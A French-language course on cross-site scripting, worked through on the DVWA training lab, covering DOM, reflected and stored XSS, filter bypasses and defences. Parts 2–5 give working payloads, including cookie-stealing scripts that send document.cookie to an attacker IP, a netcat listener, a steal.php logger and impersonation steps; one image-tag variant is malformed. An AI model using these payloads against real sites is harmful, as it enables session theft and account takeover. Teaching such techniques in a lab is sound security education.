# Cours : XSS (Cross-Site Scripting) - Exploitation et Session Hijacking

## Introduction

Cette section couvre :
- **Cross-Site Scripting (XSS)** : Exécution de JavaScript malveillant dans navigateur victime [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
- **Types de XSS** : DOM-based, Reflected, Stored [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)
- **DVWA XSS DOM** : Exploitation Low/Medium [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
- **DVWA XSS Reflected** : Exploitation Low/Medium [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
- **DVWA XSS Stored** : Exploitation et persistence [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- **Session Hijacking** : Vol de cookies et usurpation d'identité [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)

***

## Partie 1 : XSS - Concepts fondamentaux

### 1.1 Définition

**Cross-Site Scripting (XSS)** : Vulnérabilité permettant à un attaquant d'**injecter du code JavaScript malveillant** dans une page web, qui sera exécuté dans le navigateur des victimes visitant cette page. [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)

**OWASP Top 10 2021** : **A03:2021 – Injection** (XSS fait partie de cette catégorie).

**Impact**  : [invicti](https://www.invicti.com/learn/cookie-hijacking)
- 🔴 **Vol de cookies/sessions** : Session hijacking
- 🔴 **Vol de credentials** : Keylogging, phishing
- 🔴 **Defacement** : Modification de la page
- 🔴 **Redirection malveillante** : Vers site de phishing
- 🔴 **Propagation de malware** : Drive-by download

### 1.2 Types de XSS

**Les 3 types principaux**  : [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)

| Type | Stockage | Exécution | Persistance | Gravité |
|------|----------|-----------|-------------|---------|
| **DOM-based** | Client (DOM) | Client uniquement | Non persistante | Moyenne |
| **Reflected** | Serveur (temporaire) | Serveur + Client | Non persistante | Moyenne |
| **Stored** | Serveur (DB) | Tous les visiteurs | Persistante | **Critique** |

#### a) DOM-based XSS [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)

**Définition** : L'attaque manipule le **Document Object Model (DOM)** directement dans le navigateur, **sans que le serveur ne soit impliqué**. [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)

**Caractéristique clé** : Le payload **ne passe jamais par le serveur** → Filtrage serveur inefficace. [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)

**Exemple vulnérable**  : [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)

```html
<!-- URL: https://example.com/#<script>alert('XSS')</script> -->
<script>
    // Code JavaScript client-side
    var lang = window.location.hash.substring(1); // Récupère fragment (#)
    document.getElementById('output').innerHTML = lang; // Injection !
</script>

<div id="output"></div>
```

**Exploitation** :
```
URL: https://example.com/#<script>alert('XSS')</script>
→ JavaScript exécuté dans le navigateur
```

#### b) Reflected XSS [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

**Définition** : L'input utilisateur est **immédiatement renvoyé** par le serveur dans la page HTML, **sans être stocké**. [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)

**Flux d'attaque**  : [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
```
1. Attaquant crée URL malveillante
2. Victime clique sur l'URL (phishing)
3. Serveur inclut payload dans réponse HTML
4. Navigateur exécute JavaScript
```

**Exemple vulnérable**  : [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)

```php
<?php
// Page de recherche
$search = $_GET['q'];
echo "Résultats pour : " . $search;
?>
```

**Exploitation** :
```
URL: https://example.com/search.php?q=<script>alert('XSS')</script>

Réponse HTML:
Résultats pour : <script>alert('XSS')</script>
→ Script exécuté
```

#### c) Stored XSS (Persistent) [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

**Définition** : Le payload est **stocké sur le serveur** (DB, fichier) et exécuté **chaque fois qu'un utilisateur visite la page**. [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)

**Gravité** : **La plus dangereuse** → Affecte tous les utilisateurs. [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

**Exemple vulnérable**  : [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)

```php
<?php
// Formulaire de commentaire
if ($_POST['comment']) {
    $comment = $_POST['comment'];
    // Stockage SANS validation
    mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");
}

// Affichage des commentaires
$comments = mysqli_query($conn, "SELECT text FROM comments");
while ($row = mysqli_fetch_assoc($comments)) {
    echo "<div>" . $row['text'] . "</div>"; // XSS !
}
?>
```

**Exploitation** :
```
Commentaire: <script>alert('XSS')</script>
→ Stocké dans DB
→ Exécuté pour TOUS les visiteurs
```

***

## Partie 2 : DVWA XSS (DOM) - Exploitation

### 2.1 Configuration

```
1. DVWA → XSS (DOM)
2. Security: Low
```

**Interface** :

```
┌─────────────────────────────────────┐
│  Please choose a language:          │
│  [English ▼] [Select]               │
└─────────────────────────────────────┘
```

### 2.2 Analyse du comportement (Low)

**Test légitime** :

```
1. Sélectionner "French"
2. Cliquer "Select"
```

**URL modifiée**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
```
http://servertcm:8001/vulnerabilities/xss_dom/?default=French
```

**Observation** : Paramètre `default` dans l'URL contrôle la langue affichée.

**Code HTML généré** :

```html
<select name="default">
    <option value="English">English</option>
    <option value="French" selected>French</option>
    <option value="German">German</option>
    <option value="Spanish">Spanish</option>
</select>
```

### 2.3 Analyse du code source (Low)

**Code JavaScript vulnérable**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(
        document.location.href.indexOf("default=") + 8
    );
    
    // Injection dans innerHTML !
    document.write("<option value='" + lang + "'>" + lang + "</option>");
}
```

**Vulnérabilité** : `lang` est directement injecté dans `document.write()` sans validation. [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)

### 2.4 Exploitation : Injection de script (Low)

**Stratégie**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
1. Fermer les balises `<option>` et `<select>`
2. Injecter balise `<script>`
3. Exécuter JavaScript arbitraire

**Payload** :

```
default='></option></select><script>alert('XSS')</script>
```

**URL complète** :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>alert('XSS')</script>
```

**HTML généré** :

```html
<select name="default">
    <option value="English">English</option>
    <option value="'></option></select><script>alert('XSS')</script>">
        '></option></select><script>alert('XSS')</script>
    </option>
</select>
```

**Résultat** : Pop-up `alert('XSS')` affiché ! ✅

**Explication détaillée** :

```html
Payload: '></option></select><script>alert('XSS')</script>

1. '           → Ferme l'attribut value='
2. >           → Ferme la balise <option>
3. </option>   → Ferme proprement <option>
4. </select>   → Ferme proprement <select>
5. <script>alert('XSS')</script> → Code malveillant exécuté
```

### 2.5 Exploitation : Redirection malveillante

**Payload**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)

```javascript
'></option></select><script>document.location.href="https://evil.com/phishing"</script>
```

**URL** :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>document.location.href="https://evil.com/phishing"</script>
```

**Résultat** : Victime redirigée vers site malveillant.

**Cas d'usage** :
- Phishing : Fausse page de login
- Drive-by download : Téléchargement de malware
- Affiliation : Clics frauduleux

### 2.6 Exploitation : Medium Security

**Configuration** :

```
DVWA Security → Medium
```

**Test payload précédent** :

```
'></option></select><script>alert('XSS')</script>
→ Ne fonctionne plus ❌
```

**Code source (Medium)**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)

```php
<?php
// Filtrage côté serveur
$default = $_GET['default'];
$default = str_replace("<script", "", $default);
echo $default;
?>
```

**Protection** : Filtre `<script` → Supprimé.

**Bypass : Balise `<img>` avec `onerror`**  : [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)

**Payload** :

```html
"></option></select><img src=x onerror="alert('XSS')">
```

**URL** :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default="></option></select><img src=x onerror="alert('XSS')">
```

**Explication** :
- `<img src=x>` : Balise image avec source invalide
- `onerror="alert('XSS')"` : Event handler exécuté quand image échoue
- Bypass réussi car filtre cible seulement `<script>` [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)

**Résultat** : Pop-up affiché ! ✅

**Alternatives**  : [gayunkim-1.tistory](https://gayunkim-1.tistory.com/28)

```html
<!-- SVG onload -->
"></option></select><svg onload="alert('XSS')">

<!-- Body onload -->
"></option></select><body onload="alert('XSS')">

<!-- iframe srcdoc -->
"></option></select><iframe srcdoc="<script>alert('XSS')</script>">
```

***

## Partie 3 : DVWA XSS (Reflected) - Exploitation

### 3.1 Configuration

```
1. DVWA → XSS (Reflected)
2. Security: Low
```

**Interface** :

```
┌─────────────────────────────────────┐
│  What's your name?                  │
│  [________] [Submit]                │
└─────────────────────────────────────┘
```

### 3.2 Exploitation : Low Security

**Test légitime** :

```
Input: John
Résultat: Hello John
```

**URL** :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=John
```

**Payload XSS** :

```html
<script>alert('XSS')</script>
```

**URL** :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

**Résultat** : Pop-up affiché directement ! ✅

### 3.3 Exploitation : Medium Security

**Test payload précédent** :

```
<script>alert('XSS')</script>
→ Filtré ❌
```

**Bypass avec `<img onerror>`**  : [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)

**Payload** :

```html
<img onerror="alert('XSS')" src=x>
```

**URL** :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=<img onerror="alert('XSS')" src=x>
```

**Résultat** : Pop-up affiché ! ✅

***

## Partie 4 : DVWA XSS (Stored) - Exploitation

### 4.1 Configuration

```
1. DVWA → XSS (Stored)
2. Security: Low
```

**Interface** :

```
┌─────────────────────────────────────┐
│  Name:    [________________]        │
│  Message: [__________________]      │
│           [__________________]      │
│           [Sign Guestbook]          │
└─────────────────────────────────────┘
```

### 4.2 Limitation de champ (à bypasser)

**Observation** :

```html
<input type="text" name="txtName" maxlength="10">
```

**Limitation** : Champ `Name` limité à **10 caractères** côté client.

**Bypass**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)

```
1. Navigateur → F12 (DevTools)
2. Inspecteur → Sélectionner <input name="txtName">
3. Modifier attribut : maxlength="10" → maxlength="100"
4. OU supprimer attribut maxlength
```

**Alternative (ZAP)** :

```
1. ZAP History → POST /vulnerabilities/xss_s/
2. Open/Resend with Request Editor
3. Modifier body : txtName=<script>alert('XSS')</script>
4. Send
```

### 4.3 Exploitation : Low Security

**Payload** :

```
Name: <script>alert('XSS')</script>
Message: Test message
```

**Résultat** :

```
1. Soumettre le formulaire
2. Page se recharge
3. Pop-up alert('XSS') affiché
4. Pop-up affiché pour TOUS les visiteurs de la page
```

**Succès** : XSS Stored persistant ! 🔴

**Observation** : Même après rafraîchissement, le payload reste actif (stocké en DB).

### 4.4 Test de persistance

**Ouvrir navigateur en mode privé** :

```
1. Nouvelle fenêtre privée
2. Accéder à DVWA XSS (Stored)
3. Sans aucune action → Pop-up s'affiche automatiquement
```

**✅ Confirmation** : XSS Stored affecte **tous les utilisateurs**.

***

## Partie 5 : Session Hijacking via XSS - Cookie Stealing

### 5.1 Concept

**Session Hijacking** : Technique permettant de **voler le cookie de session** d'un utilisateur pour **usurper son identité** sans connaître son mot de passe. [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)

**Workflow d'attaque**  : [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)

```
1. Attaquant injecte XSS (Stored de préférence)
2. Victime visite la page
3. JavaScript malveillant s'exécute
4. document.cookie envoyé vers serveur attaquant
5. Attaquant récupère cookie PHPSESSID
6. Attaquant impersonne la victime
```

### 5.2 Analyse du cookie de session

**Inspecter les cookies** :

```
1. DVWA connecté
2. F12 → Application (Chrome) ou Stockage (Firefox)
3. Cookies → http://servertcm:8001
```

**Cookies présents** :

| Nom | Valeur | HttpOnly | Secure | SameSite |
|-----|--------|----------|--------|----------|
| `PHPSESSID` | `abc123def456...` | ❌ Non | ❌ Non | None |
| `security` | `low` | ❌ Non | ❌ Non | None |

**⚠️ Vulnérabilité** : **HttpOnly = Non** → Cookie accessible via JavaScript. [invicti](https://www.invicti.com/learn/cookie-hijacking)

### 5.3 Test d'accès au cookie via JavaScript

**Console navigateur** (F12 → Console) :

```javascript
console.log(document.cookie);
```

**Résultat** :

```
PHPSESSID=abc123def456...; security=low
```

**✅ Confirmation** : Cookie accessible via `document.cookie`. [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)

### 5.4 Préparation : Listener Netcat

**Sur machine attaquante (Kali)** :

```bash
# Lancer listener sur port 8000
nc -nvlp 8000

# -n : No DNS
# -v : Verbose
# -l : Listen
# -p : Port 8000
```

**Résultat** :

```
listening on [any] 8000 ...
```

### 5.5 Injection du payload de vol de cookie

**Stratégie** :
1. Injecter JavaScript dans XSS (Stored)
2. JavaScript envoie `document.cookie` vers serveur attaquant
3. Utiliser `fetch()` pour requête HTTP

**Payload**  : [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)

```html
<script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
```

**Explication** :
- `fetch()` : API moderne pour requêtes HTTP
- `http://192.168.1.48:8000/` : IP de la machine attaquante (Kali)
- `document.cookie` : Cookie de session de la victime
- Requête GET vers `http://192.168.1.48:8000/PHPSESSID=abc123...`

**Injection** :

```
1. DVWA → XSS (Stored)
2. Name: [modifier maxlength]
3. Name: Hacker
4. Message: <script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
5. Sign Guestbook
```

### 5.6 Extraction du cookie

**Résultat sur Netcat** :

```
listening on [any] 8000 ...
connect to [192.168.1.48] from (UNKNOWN) [192.168.1.100] 54321
GET /PHPSESSID=abc123def456ghi789jkl012mno345; security=low HTTP/1.1
Host: 192.168.1.48:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Referer: http://servertcm:8001/vulnerabilities/xss_s/
```

**Cookie extrait** :

```
PHPSESSID=abc123def456ghi789jkl012mno345
security=low
```

**Succès** : Cookie de session volé ! 🎯

### 5.7 Session Hijacking - Impersonation

**Ouvrir navigateur privé** :

```
1. Nouvelle fenêtre privée (Ctrl+Shift+N)
2. Accéder à DVWA : http://servertcm:8001
```

**Observation** : Page de login affichée (pas connecté).

**Injection du cookie volé**  : [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)

```
1. F12 → Application → Cookies → http://servertcm:8001
2. Ajouter nouveau cookie :
   - Name: PHPSESSID
   - Value: abc123def456ghi789jkl012mno345
   - Domain: servertcm
   - Path: /
   - HttpOnly: ☐ (décoché)
   - Secure: ☐ (décoché)
3. Sauvegarder
```

**Accès à DVWA** :

```
1. Supprimer "/login.php" de l'URL
2. URL : http://servertcm:8001/
3. Rafraîchir la page
```

**Résultat** :

```
┌─────────────────────────────────────┐
│  Damn Vulnerable Web Application    │
│                                     │
│  Welcome admin                      │
│  Logout                             │
└─────────────────────────────────────┘
```

**✅ Succès** : Connecté en tant qu'admin **sans mot de passe** ! [invicti](https://www.invicti.com/learn/cookie-hijacking)

### 5.8 Variantes du payload

**Alternative 1 : Image invisible**  : [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)

```html
<img src="http://192.168.1.48:8000/steal.php?cookie=" + document.cookie style="display:none">
```

**Alternative 2 : XMLHttpRequest** :

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://192.168.1.48:8000/" + document.cookie, true);
xhr.send();
</script>
```

**Alternative 3 : Serveur PHP pour logging** :

**Fichier `steal.php` sur attaquant** :

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookies.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```

**Payload** :

```html
<script>fetch('http://192.168.1.48:8000/steal.php?cookie='+document.cookie);</script>
```

***

## Partie 6 : Protections contre XSS

### 6.1 Encodage de sortie (Output Encoding) [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)

**Principe** : Encoder les caractères spéciaux avant de les afficher.

**PHP** :

```php
<?php
// Mauvais
echo $_GET['name'];

// Bon : htmlspecialchars()
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

// <script> devient &lt;script&gt; (affiché comme texte, pas exécuté)
?>
```

**JavaScript** :

```javascript
// Mauvais
document.getElementById('output').innerHTML = userInput;

// Bon : textContent (pas d'interprétation HTML)
document.getElementById('output').textContent = userInput;
```

### 6.2 Content Security Policy (CSP) [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)

**Header HTTP** :

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Effet** :
- ✅ Scripts autorisés seulement depuis le même domaine
- ❌ Scripts inline `<script>alert('XSS')</script>` bloqués
- ❌ `eval()` bloqué
- ❌ Event handlers inline (`onerror="..."`) bloqués

**Configuration Apache** :

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

### 6.3 HttpOnly Cookie Flag [invicti](https://www.invicti.com/learn/cookie-hijacking)

**PHP** :

```php
<?php
session_start();

// Configurer cookie HttpOnly
session_set_cookie_params([
    'httponly' => true,  // ← Bloque document.cookie
    'secure' => true,    // HTTPS uniquement
    'samesite' => 'Strict'
]);
?>
```

**Effet** : `document.cookie` retourne vide → XSS ne peut pas voler le cookie. [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)

### 6.4 Validation et sanitization côté serveur

**Whitelist** :

```php
<?php
// Autoriser seulement alphanumerique
if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die("Invalid input");
}
?>
```

**Bibliothèque HTML Purifier** :

```php
<?php
require_once 'HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);

$clean_html = $purifier->purify($dirty_html);
?>
```

### 6.5 X-XSS-Protection Header

```
X-XSS-Protection: 1; mode=block
```

**Effet** : Active le filtre XSS intégré du navigateur (obsolète dans navigateurs modernes, remplacé par CSP).

***

## Résumé : Points clés à retenir

1. **XSS** : Injection de JavaScript malveillant exécuté dans navigateur victime [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
2. **DOM-based XSS** : Manipulation DOM côté client, payload ne passe pas par serveur [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
3. **Reflected XSS** : Payload dans URL, renvoyé immédiatement par serveur [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
4. **Stored XSS** : Payload stocké en DB, exécuté pour tous les visiteurs (le plus dangereux) [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
5. **DOM Low** : `'></option></select><script>alert('XSS')</script>` [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
6. **DOM Medium** : `"></option></select><img src=x onerror="alert('XSS')">` [gayunkim-1.tistory](https://gayunkim-1.tistory.com/28)
7. **img onerror** : Bypass filtre `<script>` avec event handler [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)
8. **Stored maxlength** : Modifier attribut HTML via DevTools pour bypasser limitation
9. **Session Hijacking** : Vol de cookie PHPSESSID via `document.cookie` [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
10. **fetch() payload** : `fetch('http://IP:8000/'+document.cookie)` [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
11. **HttpOnly = Non** : Cookie accessible via JavaScript → Vulnérable [invicti](https://www.invicti.com/learn/cookie-hijacking)
12. **Impersonation** : Injecter cookie volé dans navigateur privé → Connexion sans password [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
13. **Protection** : htmlspecialchars(), CSP, HttpOnly cookie, validation [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
14. **CSP** : `script-src 'self'` bloque scripts inline [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
15. **Output Encoding** : Convertir `<` en `&lt;` avant affichage [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
